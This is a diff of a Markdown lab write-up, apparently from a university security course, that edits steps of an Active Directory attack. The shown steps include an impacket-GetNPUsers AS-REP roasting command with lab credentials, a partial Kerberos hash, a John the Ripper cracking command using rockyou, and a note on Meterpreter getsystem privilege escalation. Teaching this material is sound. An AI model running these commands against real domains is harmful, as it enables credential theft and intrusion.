@@ -136,7 +136,7 @@ As first attempt, we ask the DomainController to list all the accounts that can 
  4. **Perform AS-Rep Roasting:**
 We will try to crack the `DNSoperator` password performing a so-called **AS-Rep Roasting** attack.
 
-	For doing so, we firstly ask the DC to generate a **TGT** for each of the previous accounts and we format them so they are ready to be cracked using *John the Ripper*:
+	For doing so, we firstly ask the DC to generate a **TGT** for each of the previous accounts and we format the responses so they are ready to be cracked using *John the Ripper*:
 
     `impacket-GetNPUsers -dc-ip 10.0.2.200 cybersec.units.it/DomainUser:User00! -request -format john`
 
@@ -150,10 +150,7 @@ We will try to crack the `DNSoperator` password performing a so-called **AS-Rep 
 	    85d516545f661aef05c22fc5c26a210a4243627cf681ea61f45996fb8d235b3f9d972433c390ff3b4250f
 	    576c96c54d167a61a76717831eb320b84aa37acef60cd3f1c781bf6e`
 
- 
- 4. **Perform AS-Rep Roasting:**
- As said, we will now try to crack the password used for encoding the response obtained together with the TGT, performing a so-called **AS-Rep Roasting** attack.
-	For doing so, we will use **John the Ripper** providing a password dictionary called `rockyou`.
+	Now, we try to crack the hash using **John the Ripper**, providing a password dictionary called `rockyou`.
 	
     `john --wordlist=/usr/share/wordlists/rockyou.txt --format=krb5asrep ./Desktop/usernames.txt`
 
@@ -254,11 +251,11 @@ Other useful information about Active Directory have been retrieved from officia
 
 [^2]: `getsystem` requires the process to be run as administrator (to be "previously" authorized to run with high privileges, due to Windows UAC); then, it tries three techniques to achieve Privilege Escalation. More details [here](https://docs.rapid7.com/metasploit/meterpreter-getsystem/).
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbLTEwNTI5ODkzMTYsNDkyNjY2NDE3LC0xMT
-k1MzAyODM4LDY0MDA4OTI5OSwtMTc0MDE4Nzk0MSwtMTM1MTY5
-NjExOCw0ODQyNTkzMCwtMTY0NzY4NzU5MiwxMDk5OTMxNzQwLC
-0xMjUyNTYwNzE3LDE0OTIyODY2ODMsMjgwODQ0OTA1LC04MDQ2
-OTg4NzUsLTE4ODg3MDk1ODQsMTM0MjYzMjM3OSwtMTEyNzEwOT
-U1NSwtMjAxNTY0Mzk2MCwyMDQxMzU4MjQ0LC04OTA4MjkyNjIs
-MTQxNDYxOTcwNF19
+eyJoaXN0b3J5IjpbOTc3OTEyNTE2LDQ5MjY2NjQxNywtMTE5NT
+MwMjgzOCw2NDAwODkyOTksLTE3NDAxODc5NDEsLTEzNTE2OTYx
+MTgsNDg0MjU5MzAsLTE2NDc2ODc1OTIsMTA5OTkzMTc0MCwtMT
+I1MjU2MDcxNywxNDkyMjg2NjgzLDI4MDg0NDkwNSwtODA0Njk4
+ODc1LC0xODg4NzA5NTg0LDEzNDI2MzIzNzksLTExMjcxMDk1NT
+UsLTIwMTU2NDM5NjAsMjA0MTM1ODI0NCwtODkwODI5MjYyLDE0
+MTQ2MTk3MDRdfQ==
 -->
